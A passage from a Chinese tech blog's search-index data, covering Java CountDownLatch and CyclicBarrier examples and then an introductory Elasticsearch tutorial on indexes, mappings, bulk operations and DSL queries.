CountDownLatch(1);    public static void main(String[] args) &#123;        try &#123;            // 创建5个运动员跑步            for (int i = 1; i &lt;= 5; i++) &#123;                new Athlete(i).start();            &#125;            // 保证所有运动员都准备好            Thread.sleep(2000);            // 裁判吹哨            System.out.println(&quot;嘟！&quot;);            countDownLatch.countDown();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    //运动员    private static class Athlete extends Thread &#123;        // 运动员编号        private int id;        public Athlete(int id) &#123;            this.id = id;        &#125;        @Override        public void run() &#123;            try &#123;                // 运动员准备就绪                System.out.println(&quot;运动员&quot; + id + &quot;号准备就绪！&quot;);                // 等待裁判哨声                countDownLatch.await();                // 运动员启动                System.out.println(&quot;运动员&quot; + id + &quot;号启动！&quot;);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n这个案例非常形象，相信大家一看就懂，将CountDownLatch的初值设置为1，所有运动员准备就绪后await()裁判的哨声，裁判吹哨后countDown将计数值减为0，这时五个线程可用同时继续执行下面的代码。\n如果说案例一是等待多个线程同时完成，本案例则是等待多个线程同时开始，大家注意区别两个案例中CountDownLatch方法的使用顺序。\nCyclicBarrier什么是CyclicBarrierCyclicBarrier表示周期屏障，让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续运行。\n怎么使用CyclicBarrierAPI\n构造方法\n\n\n\n\n方法\n说明\n\n\n\nCyclicBarrier(int parties)\nparties是屏障的初值，每个线程到达后值减1\n\n\nCyclicBarrier(int parties, Runnable barrierAction)\nbarrierAction表示通过屏障后，优先执行barrierAction，方便处理更复杂的业务场景\n\n\n\n等待方法\n\n\n\n\n方法\n说明\n\n\n\nawait()\n等待规定数量的线程到达屏障\n\n\nawait(long timeout, TimeUnit unit)\n等待规定数量的线程到达屏障，超过timeout时长返回false\n\n\n\n其他\n\n\n\n\n方法\n说明\n\n\n\nreset()\n重置CyclicBarrier，从0开始重新计数\n\n\ngetNumberWaiting()\n获取正在等待的线程数量\n\n\n案例一大概了解了CyclicBarrier的作用，大家首先想到案例肯定是之前的跑步比赛案例了，这次我们用CyclicBarrier实现跑步比赛的场景。代码如下：\npublic class CyclicBarrierTest1 &#123;    // 创建cyclicBarrier，初始计数值为5    static CyclicBarrier cyclicBarrier = new CyclicBarrier(5);    public static void main(String[] args) &#123;        try &#123;            // 创建5个运动员跑步            for (int i = 1; i &lt;= 5; i++) &#123;                new Athlete(i).start();            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    //运动员    private static class Athlete extends Thread &#123;        // 运动员编号        private int id;        public Athlete(int id) &#123;            this.id = id;        &#125;        @Override        public void run() &#123;            try &#123;                // 运动员准备就绪                System.out.println(&quot;运动员&quot; + id + &quot;号准备就绪！&quot;);                // 等待所有运动员就绪                cyclicBarrier.await();                // 运动员启动                System.out.println(&quot;运动员&quot; + id + &quot;号启动！&quot;);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n这次和之前的CountDownLatch中的案例稍有不同，本案例中我们没有裁判，而是等所有线程都到达屏障后立刻同时启动。\n案例二同样，我们用CyclicBarrier来实现之前的数据处理案例，即等待所有分块数据处理完后才能对总体数据进行分析：\npublic class CyclicBarrierTest2 implements Runnable &#123;    // 创建cyclicBarrier，初始计数值为3，模拟3块数据    private CyclicBarrier cyclicBarrier = new CyclicBarrier(3, this);    // 所有数据分析完后，总体分析    @Override    public void run() &#123;        System.out.println(&quot;所有数据处理完毕,开始总体分析&quot;);        // 分析完后重置cyclicBarrier        cyclicBarrier.reset();    &#125;    // 分块处理数据的线程类    public class Task extends Thread &#123;        // 数据的块号        int id;        public Task(int id) &#123;            this.id = id;        &#125;        @Override        public void run() &#123;            try &#123;                System.out.println(&quot;处理第&quot; + id + &quot;块数据&quot;);                // 模拟数据处理时间                TimeUnit.SECONDS.sleep(id);                // 内存屏障，等待所有数据块都处理完毕                cyclicBarrier.await();            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;        // 创建3个线程启动，模拟处理3块数据    public void analyse() &#123;        for (int i = 1; i &lt;= 3; i++) &#123;            new Task(i).start();        &#125;    &#125;        public static void main(String[] args) &#123;        CyclicBarrierTest2 cyclicBarrierTest2 = new CyclicBarrierTest2();        cyclicBarrierTest2.analyse();    &#125;&#125;\n\n我们将CyclicBarrier的初值设为3，需要等待3块数据全部处理完毕后，这三个线程才能同时通过await()，通过后会优先执行this的run方法，也就是CyclicBarrierTest2的run方法，在这里面我们执行数据总体分析的流程。\n区别CountDownLatch和CyclicBarrier的区别如下：\n\n\n\nCountDownLatch\nCyclicBarrier\n\n\n\n减计数方式\n加计数方式\n\n\n计算为0时释放所有等待的线程\n计数达到指定值时释放所有等待线程\n\n\n计数为0时，无法重置\n计数达到指定值时，计数置为0重新开始\n\n\n调用countDown()方法计数减一，调用await()方法只进行阻塞，对计数没任何影响\n调用await()方法计数加1，若加1后的值不等于构造方法的值，则线程阻塞\n\n\n不可重复利用\n可重复利用\n\n\n","tags":["2021"]},{"title":"ELK","url":"/2021/07/25/2021/ELK/","content":"\n\nElasticSearch简介Elasticsearch是用Java开发并且是当前最流行的开源的企业级搜索引擎。能够达到实时搜索，稳定，可靠，快速，安装使用方便。客户端支持Java、.NET（C#）、PHP、Python、Ruby等多种语言。\nES与Lucene的关系Lucene可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库（框架）。但是想要使用Lucene，必须使用Java来作为开发语言并将其直接集成到你的应用中，并且Lucene的配置及使用非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。Lucene缺点：\n\n只能在Java项目中使用,并且要以jar包的方式直接集成项目中；\n使用非常复杂，创建索引和搜索索引代码繁杂；\n不支持集群环境-，索引数据不同步（不支持大型项目）；\n索引数据如果太多就不行，索引库和应用所在同一个服务器，共同占用硬盘。\n\n上述Lucene框架中的缺点,ES全部都能解决。\nEs与Solr当单纯的对已有数据进行搜索时，Solr更快：\n\n当实时建立索引时Solr会产生io阻塞（Solr需要从磁盘读数据），查询性能较差，Elasticsearch具有明显的优势：\n\n大型互联网公司，实际生产环境测试，将搜索引擎从Solr转到 Elasticsearch以后的平均查询速度有了50倍的提升：\n\n总结一下：\n\nSolr 利用 Zookeeper 进行分布式管理，而Elasticsearch 自身带有分布式协调管理功能。\nSolr 支持更多格式的数据，比如JSON、XML、CSV，而 Elasticsearch 仅支持json文件格式。\nSolr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch。\nSolr 是传统搜索应用的有力解决方案，但 Elasticsearch更适用于新兴的实时搜索应用。\n\nEs与关系型数据库\n全文检索全文检索是指：\n对下图进行一个简要解释，说明全文检索的流程和理论：\n首先我们对三个文本进行分词处理，得到对应的表，表中的index表示属于第几个文本【也就是文本的id\n之后我们去重处理，通过图中可以发现，hello在第1、2个文本，elasticsearch在2、3文本。\n之后我们对word进行排序处理，是字母序【个人认为这是为了检索的更快，二分速度结束。\n现在当我们输入关键字的时候，我们在最后一张表中可以发现关键字存在的文本index是哪些，如此便可把对应文本输出出来。\n搜索迅速的原因在于：单词是有限的，那么当我们每次进行词条添加时，对应的关键字可能都已经存在过了，仅仅需要在关键字的index中添加记录即可。\n\n\n通过一个程序扫描文本中的每一个单词，针对单词建立索引，并保存该单词在文本中的位置、以及出现的次数\n用户查询时，通过之前建立好的索引来查询，将索引中单词对应的文本位置、出现的次数返回给用户，因为有了具体文本的位置，所以就可以将具体内容读取出来了\n\n索引就类似于目录，平时我们使用的都是索引，都是通过主键定位到某条数据。那么倒排索引刚好相反，数据对应到主键。\n核心概念\n索引index\n一个索引就是一个拥有几分相似特征的文档的集合。比如说，可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引。 一个索引由一个名字来标识（必须全部是小写字母的），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用到这个名字。\n\n映射mapping\nElasticSearch中的映射（Mapping）用来定义一个文档。mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分词器、是否被索引等等，这些都是映射里面可以设置的。\n\n字段field\n\n\n相当于是数据表的字段|列。\n\n字段类型type\n\n每一个字段都应该有一个对应的类型，例如Text、Keyword、Byte等。\n\n文档document\n\n一个文档是一个可被索引的基础信息单元，类似一条记录。文档以JSON（Javascript Object Notation）格式来表示。\n\n集群 cluster\n\n一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。\n\n节点 node\n\n一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。 一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做elasticsearch的集群中。这意味着，如果在网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做elasticsearch的集群中。在一个集群里，可以拥有任意多个节点。而且，如果当前网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做elasticsearch的集群。\n\n分片shards\n\n一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。\n为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当创建一个索引的时候，可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的索引，这个索引可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：\n\n允许水平分割&#x2F;扩展你的内容容量。\n允许在分片之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。\n\n至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户来说这些都是透明的。\n\n副本replicas\n\n在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做副本分片，或者直接叫副本。副本之所以重要，有两个主要原因：\n\n在分片&#x2F;节点失败的情况下，提供了高可用性。注意到复制分片不要与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。\n扩展搜索量&#x2F;吞吐量，因为搜索可以在所有的副本上并行运行。\n\n每个索引可以被分成多个分片，一个索引有0个或者多个副本。一旦设置了副本，每个索引就有了主分片和副本分片，分片和副本的数量可以在索引创建的时候指定。在索引创建之后，可以在任何时候动态地改变副本的数量，但是不能改变分片的数量。\nES数据基本操作ES是面向文档（document oriented）的，这意味着它可以存储整个对象或文档（document）\n。然而它不仅仅是存储，还会索引（index）每个文档的内容使之可以被搜索。在ES中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。ES使用JSON作为文档序列化格式，JSON现在已经被大多语言所支持，而且已经成为NoSQL领域的标准格式。\n\nES使用Restful风格进行操作。Restful是一种面向资源的架构风格，可以简单理解为：使用URL定位资源，用HTTP动词（GET,POST,DELETE,PUT）描述操作。 基于Restful，ES和所有客户端的交互都是使用JSON格式的数据。使用Restful的好处：透明性，暴露资源存在。充分利用 HTTP 协议本身语义，不同请求方式进行不同的操作\n\n\n操作索引\n\n// 创建索引PUT /es_db// 查询索引GET /es_db// 删除索引DELETE /es_db\n\n\n添加文档\n\n// ES7版本后淡化了类型的概念，所有的类型名称都是_docPUT /es_db/_doc/1&#123;&quot;name&quot;: &quot;张三&quot;,&quot;sex&quot;: 1,&quot;age&quot;: 25,&quot;address&quot;: &quot;广州天河公园&quot;,&quot;remark&quot;: &quot;java developer&quot;&#125;PUT /es_db/_doc/2&#123;&quot;name&quot;: &quot;李四&quot;,&quot;sex&quot;: 1,&quot;age&quot;: 28,&quot;address&quot;: &quot;广州荔湾大厦&quot;,&quot;remark&quot;: &quot;java assistant&quot;&#125;PUT /es_db/_doc/3&#123;&quot;name&quot;: &quot;rod&quot;,&quot;sex&quot;: 0,&quot;age&quot;: 26,&quot;address&quot;: &quot;广州白云山公园&quot;,&quot;remark&quot;: &quot;php developer&quot;&#125;PUT /es_db/_doc/4&#123;&quot;name&quot;: &quot;admin&quot;,&quot;sex&quot;: 0,&quot;age&quot;: 22,&quot;address&quot;: &quot;长沙橘子洲头&quot;,&quot;remark&quot;: &quot;python assistant&quot;&#125;PUT /es_db/_doc/5&#123;&quot;name&quot;: &quot;小明&quot;,&quot;sex&quot;: 0,&quot;age&quot;: 19,&quot;address&quot;: &quot;长沙岳麓山&quot;,&quot;remark&quot;: &quot;java architect assistant&quot;&#125;\n\n\n从 ES 7.0 开始，Type 被废弃在 7.0 以及之后的版本中 Type 被废弃了。一个 index 中只有一个默认的 type，即 _doc。\nES 的Type 被废弃后，库表合一，Index 既可以被认为对应 MySQL 的 Database，也可以认为对应 table。\n也可以这样理解：\n\nES 实例：对应 MySQL 实例中的一个 Database。\nIndex 对应 MySQL 中的 Table 。\nDocument 对应 MySQL 中表的记录。\n\n\n\n修改文档\n\n// PUT /索引名称/类型/idPUT /es_db/_doc/1&#123;&quot;name&quot;: &quot;小黑&quot;,&quot;sex&quot;: 1,&quot;age&quot;: 25,&quot;address&quot;: &quot;张家界森林公园&quot;,&quot;remark&quot;: &quot;php developer assistant&quot;\t\t\t\t&#125;\n\n我们对返回值进行一个审查：\n如果不添加id，那么ES会帮我们自动生成一个id。\n&#123;  &quot;_index&quot; : &quot;es_demo&quot;,  //位于那个索引---&gt;库  &quot;_type&quot; : &quot;_doc&quot;,      //何种类型 7以后统一为认为_doc   &quot;_id&quot; : &quot;5&quot;,           //唯一id  &quot;_version&quot; : 2,        //数据可能会被更新，故而有版本号  &quot;result&quot; : &quot;updated&quot;,  //当前操作是属于更新操作  &quot;_shards&quot; : &#123;              &quot;total&quot; : 2,    &quot;successful&quot; : 1,    &quot;failed&quot; : 0  &#125;,  &quot;_seq_no&quot; : 5,  &quot;_primary_term&quot; : 2&#125;\n\n\nPOST和PUT都能起到创建或更新的作用，它们的区别如下：\n\nPUT需要对一个具体的资源进行操作也就是要确定id才能进行更新&#x2F;创建，不加id会报异常；而POST是可以针对整个资源集合进行操作的，如果不写id就由ES生成一个唯一id进行创建新文档，如果填了id那就针对这个id的文档进行创建&#x2F;更新。\nPUT只会将json数据都进行替换，POST只会更新相同字段的值。\nPUT与DELETE都是幂等性操作，即不论操作多少次结果都一样。\n\n\n\n查询文档\n\n1. 查询指定id文档GET /索引名称/类型/id2. 查询所有文档GET /索引名称/类型/_search3. 等值、大于、小于查询，A字段的值为BGET /索引名称/类型/_search?q=A:BGET /索引名称/类型/_search?q=A:&lt;BGET /索引名称/类型/_search?q=A:&gt;B4. 范围查询，A字段的范围是m到nGET /索引名称/类型/_search?q=A[m TO n]5. 多id查询GET /索引名称/类型/_mget &#123; &quot;ids&quot;:[&quot;1&quot;,&quot;2&quot;]  &#125;6. 分页查询GET /索引名称/类型/_search?from=0&amp;size=17. 投影GET /索引名称/类型/_search?_source=字段1,字段28. 排序（desc降序、asc升序）GET /索引名称/类型/_search?sort=字段:desc\n\n\n删除文档\n\nDELETE /索引名称/类型/id\n\n批量操作\n批量获取文档数据\n\n批量获取文档数据是通过_mget的API来实现的：\nGET _mget&#123;  &quot;docs&quot;: [    &#123;      &quot;_index&quot;: &quot;es_db&quot;,      &quot;_type&quot;: &quot;_doc&quot;,      &quot;_id&quot;: 1    &#125;,    &#123;      &quot;_index&quot;: &quot;es_db&quot;,      &quot;_type&quot;: &quot;_doc&quot;,      &quot;_id&quot;: 2    &#125;  ]&#125;\n\n也可以将索引、类型的信息写在url中：\nGET /es_db/_doc/_mget&#123;  &quot;docs&quot;: [    &#123;      &quot;_id&quot;: 3    &#125;,    &#123;      &quot;_id&quot;: 4    &#125;  ]&#125;\n\n\n批量操作文档数据，批量对文档进行写操作是通过_bulk的API来实现的\n\n请求方式：POST\n\n请求地址：_bulk\n\n请求参数：通过_bulk操作文档，一般至少有两行参数(或偶数行参数)\n\n\n第一行参数为指定操作的类型及操作的对象(index,type和id)\n第二行参数才是操作的数据\n\n\n\n参数类似于：\n&#123;&quot;actionName&quot;:&#123;&quot;_index&quot;:&quot;indexName&quot;, &quot;_type&quot;:&quot;typeName&quot;,&quot;_id&quot;:&quot;id&quot;&#125;&#125;&#123;&quot;field1&quot;:&quot;value1&quot;, &quot;field2&quot;:&quot;value2&quot;&#125;\n\n批量创建文档create\nPOST _bulk&#123;&quot;create&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;文章1&quot;,&quot;content&quot;:&quot;内容1&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;&#123;&quot;create&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;&#123;&quot;id&quot;:4,&quot;title&quot;:&quot;文章2&quot;,&quot;content&quot;:&quot;内容2&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;\n\n普通创建或全量替换index\nPOST _bulk&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;图灵徐庶老师(一)&quot;,&quot;content&quot;:&quot;图灵学院徐庶老师666&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;&#123;&quot;id&quot;:4,&quot;title&quot;:&quot;图灵诸葛老师(二)&quot;,&quot;content&quot;:&quot;图灵学院诸葛老师NB&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;\n\n\n如果原文档不存在，则是创建\n如果原文档存在，则是替换(全量修改原文档)\n区别在于actionName\n\n批量删除：\nPOST _bulk&#123;&quot;delete&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;delete&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;\n\n依靠唯一id进行删除，也就不需要那个field对参数了\n批量修改：\nPOST _bulk&#123;&quot;update&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;doc&quot;:&#123;&quot;title&quot;:&quot;ES大法必修内功&quot;&#125;&#125;&#123;&quot;update&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;&#123;&quot;doc&quot;:&#123;&quot;create_time&quot;:1554018421008&#125;&#125;\n\n这里是依靠唯一id确定位置，然后对所需要修改的值进行处理就好了\n文档映射简介ES中映射可以分为动态映射和静态映射：\n\n动态映射\n\n在关系数据库中，需要事先创建数据库，然后在该数据库下创建数据表，并创建表字段、类型、长度、主键等，最后才能基于表插入数据。而Elasticsearch中不需要定义Mapping映射（即关系型数据库的表、字段等），在文档写入Elasticsearch时，会根据文档字段自动识别类型，这种机制称之为动态映射。动态映射规则如下：\n\n\n静态映射\n\n静态映射是在Elasticsearch中也可以事先定义好映射，包含文档的各字段类型、分词器等，这种方式称之为静态映射。\n核心类型\n字符串：string类型包含 text 和 keyword\n\ntext：该类型被用来索引长文本，在创建索引前会将这些文本进行分词，转化为词的组合，建立索引；允许ES来检索这些词，text类型不能用来排序和聚合。\nkeyword：该类型不能分词，可以被用来检索过滤、排序和聚合，keyword类型不可用text进行分词模糊检索。\n\n\n数值型：long、integer、short、byte、double、float\n\n日期型：date\n\n布尔型：boolean\n\n\n映射操作创建映射：\nPUT /es_db&#123;  &quot;mappings&quot;: &#123;    &quot;properties&quot;: &#123;      &quot;name&quot;: &#123;        &quot;type&quot;: &quot;keyword&quot;,        &quot;index&quot;: true,        &quot;store&quot;: true      &#125;,      &quot;sex&quot;: &#123;        &quot;type&quot;: &quot;integer&quot;,        &quot;index&quot;: true,        &quot;store&quot;: true      &#125;,      &quot;age&quot;: &#123;        &quot;type&quot;: &quot;integer&quot;,        &quot;index&quot;: true,        &quot;store&quot;: true      &#125;,      &quot;book&quot;: &#123;        &quot;type&quot;: &quot;text&quot;,        &quot;index&quot;: true,        &quot;store&quot;: true,        &quot;analyzer&quot;: &quot;ik_smart&quot;,        &quot;search_analyzer&quot;: &quot;ik_smart&quot;      &#125;,      &quot;address&quot;: &#123;        &quot;type&quot;: &quot;text&quot;,        &quot;index&quot;: true,        &quot;store&quot;: true      &#125;    &#125;  &#125;&#125;\n\n获取文档映射：\nGET /es_db/_mapping\n\n对已存在的mapping映射进行修改：\n\n如果要推倒现有的映射，你得重新建立一个静态索引\n然后把之前索引里的数据导入到新的索引里\n删除原创建的索引\n为新索引起个别名, 为原索引名\n\n// 数据迁移POST _reindex&#123;  &quot;source&quot;: &#123;    &quot;index&quot;: &quot;db_index&quot;  &#125;,  &quot;dest&quot;: &#123;    &quot;index&quot;: &quot;db_index_2&quot;  &#125;&#125;// 删除原索引DELETE /db_index// 修改新索引的别名PUT /db_index_2/_alias/db_index\n\n通过这几个步骤就实现了索引的平滑过渡，并且是零停机。\nDSL查询基本增删改查//创建索引//格式: PUT /索引名称PUT /es_demo//查询索引//格式: GET /索引名称GET /es_demo//删除索引//格式: DELETE /索引名称DELETE /es_demo//添加文档 //格式: PUT /索引名称/类型/idPUT /es_demo/_doc/1&#123;&quot;name&quot;: &quot;张三&quot;,&quot;sex&quot;: 1,&quot;age&quot;: 21,&quot;address&quot;: &quot;南京&quot;,&quot;remark&quot;: &quot;java developer&quot;&#125;//删除文档//DELETE /索引名称/类型/idDELETE /es_demo/_doc/1//修改文档 //PUT /索引名称/类型/idPUT /es_demo/_doc/1&#123;&quot;name&quot;: &quot;李多安&quot;,&quot;sex&quot;: 1,&quot;age&quot;: 21,&quot;address&quot;: &quot;深圳&quot;,&quot;remark&quot;: &quot;go developer&quot;\t\t\t\t&#125;//查询文档//GET /索引名称/类型/idGET /es_demo/_doc/1\n\n注意:POST和PUT都能起到创建&#x2F;更新的作用\n需要注意的是PUT需要对一个具体的资源进行操作也就是要确定id才能进行更新&#x2F;创建，\n而POST是可以针对整个资源集合进行操作的，如果不写id就由ES生成一个唯一id进行创建新文档，如果填了id那就针对这个id的文档进行创建&#x2F;更新\nPUT只会将json数据都进行替换, POST只会更新相同字段的值\nPUT与DELETE都是幂等性操作, 即不论操作多少次, 结果都一样\n​\t\t\t\n简单查询//查询当前类型中的所有文档 _search//格式: GET /索引名称/类型/_search//举例: GET /es_demo/_doc/_search//SQL:  select * from student//条件查询格式: GET /索引名称/类型/_search?q=*:***举例: GET /es_demo/_doc/_search?q=age:28SQL:  select * from student where age = 28//范围查询格式: GET /索引名称/类型/_search?q=***[25 TO 26]举例: GET /es_demo/_doc/_search?q=age[25 TO 26]SQL:  select * from student where age between 25 and 26//根据多个ID进行批量查询格式: GET /索引名称/类型/_mget举例: GET /es_demo/_doc/_mget &#123; &quot;ids&quot;:[&quot;1&quot;,&quot;2&quot;]   &#125;SQL:  select * from student where id in (1,2)\t//查询年龄小于等于格式: GET /索引名称/类型/_search?q=age:&lt;=**举例: GET /es_demo/_doc/_search?q=age:&lt;=28SQL:  select * from student where age &lt;= 28//查询年龄大于格式: GET /索引名称/类型/_search?q=age:&gt;**举例: GET /es_demo/_doc/_search?q=age:&gt;28SQL:  select * from student where age &gt; 28//分页查询格式: GET /索引名称/类型/_search?q=age[25 TO 26]&amp;from=0&amp;size=1举例: GET /es_demo/_doc/_search?q=age[25 TO 26]&amp;from=0&amp;size=1SQL:  select * from student where age between 25 and 26 limit 0, 1 //对查询结果只输出某些字段格式: GET /索引名称/类型/_search?_source=字段,字段举例: GET /es_demo/_doc/_search?_source=name,ageSQL:  select name,age from student//对查询结构进行排序格式: GET /索引名称/类型/_search?sort=字段 desc举例: GET /es_demo/_doc/_search?sort=age:descSQL:  select * from student order by age desc 【逆序\n\n批量操作批量获取文档数据批量获取批量获取文档数据是使用_mget的API来实现的。\nGET /es_db/_doc/_mget&#123;  &quot;docs&quot;: [    &#123;      &quot;_id&quot;: 3    &#125;,    &#123;      &quot;_id&quot;: 4    &#125;  ]&#125;\n\n批量操作\n批量操作文档数据，批量对文档进行写操作是通过_bulk的API来实现的\n\n请求方式：POST\n\n请求地址：_bulk\n\n请求参数：通过_bulk操作文档，一般至少有两行参数(或偶数行参数)\n\n\n第一行参数为指定操作的类型及操作的对象(index,type和id)\n第二行参数才是操作的数据\n\n\n\n&#123;&quot;actionName&quot;:&#123;&quot;_index&quot;:&quot;indexName&quot;, &quot;_type&quot;:&quot;typeName&quot;,&quot;_id&quot;:&quot;id&quot;&#125;&#125;&#123;&quot;field1&quot;:&quot;value1&quot;, &quot;field2&quot;:&quot;value2&quot;&#125;\n\n批量新增文档\nPOST _bulk&#123;&quot;create&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;文章1&quot;,&quot;content&quot;:&quot;内容1&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;&#123;&quot;create&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;&#123;&quot;id&quot;:4,&quot;title&quot;:&quot;文章2&quot;,&quot;content&quot;:&quot;内容2&quot;,&quot;tags&quot;:[&quot;java&quot;, &quot;面向对象&quot;],&quot;create_time&quot;:1554015482530&#125;\n\n批量删除：\nPOST _bulk&#123;&quot;delete&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;delete&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;\n\n依靠唯一id进行删除，也就不需要那个field对参数了\n批量修改：\nPOST _bulk&#123;&quot;update&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:3&#125;&#125;&#123;&quot;doc&quot;:&#123;&quot;title&quot;:&quot;ES大法必修内功&quot;&#125;&#125;&#123;&quot;update&quot;:&#123;&quot;_index&quot;:&quot;article&quot;, &quot;_type&quot;:&quot;_doc&quot;, &quot;_id&quot;:4&#125;&#125;&#123;&quot;doc&quot;:&#123;&quot;create_time&quot;:1554018421008&#125;&#125;\n\n这里是依靠唯一id确定位置，然后对所需要修改的值进行处理就好了\n批量操作的增删改都是依靠actionName来决定任务的。\nDSL查询\n无条件查询无查询条件是查询所有，默认是查询所有的，或者使用match_all表示所有：\nGET /es_db/_doc/_search&#123;&quot;query&quot;:&#123;  &quot;match_all&quot;:&#123;&#125;   &#125;&#125;\n\n有条件查询有条件查询分为叶子查询、组合查询和连接查询。\n叶子查询模糊匹配模糊匹配主要是针对文本类型的字段，文本类型的字段会对内容进行分词。\n查询时也会对搜索条件进行分词，然后通过倒排索引查找到匹配的数据，模糊匹配主要通过match等参数来实现。\n模糊匹配主要有三种查询match，prefix，regexp三种类型。\n\nmatch\n\n通过match关键词模糊匹配条件内容（通过match查询一个keyword字段时，如果查询内容和该字段内容一模一样，也是可以查出来的）\nPOST /es_db/_doc/_search&#123;  &quot;from&quot;: 0,  &quot;size&quot;: 2,  &quot;query&quot;: &#123;    &quot;match&quot;: &#123;      &quot;address&quot;: &quot;南京&quot;   // 如果address是keyword类型的，使用match查询必须完全一致才能查到    &#125;  &#125;&#125;// multi_match多字段模糊匹配查询//两个字段中存在一个就可以POST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;multi_match&quot;: &#123;      &quot;query&quot;: &quot;张三&quot;,      &quot;fields&quot;: [        &quot;address&quot;,        &quot;name&quot;      ]    &#125;  &#125;&#125;// query_string未指定字段条件查询(查询所有字段)POST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;query_string&quot;: &#123;      &quot;query&quot;: &quot;广州 OR 长沙&quot;    &#125;  &#125;&#125;// query_string指定字段条件查询POST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;query_string&quot;: &#123;      &quot;query&quot;: &quot;admin OR 长沙&quot;,      &quot;fields&quot;: [        &quot;name&quot;,        &quot;address&quot;      ]    &#125;  &#125;&#125;\n\n\nmatch条件还支持以下参数：\n\nquery : 指定匹配的值\noperator : 匹配条件类型\n\nand : 条件分词后都要匹配\nor : 条件分词后有一个匹配即可(默认)\n\n\nminmum_should_match : 指定最小匹配的数量\n\n\n注意query_string的用法，这个地方的如果不加field列，就会所有字段扫描。\n\nprefix\n\n前缀匹配\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;prefix&quot;: &#123;      &quot;name.keyword&quot;: &#123;        &quot;value&quot;: &quot;li&quot;      &#125;    &#125;  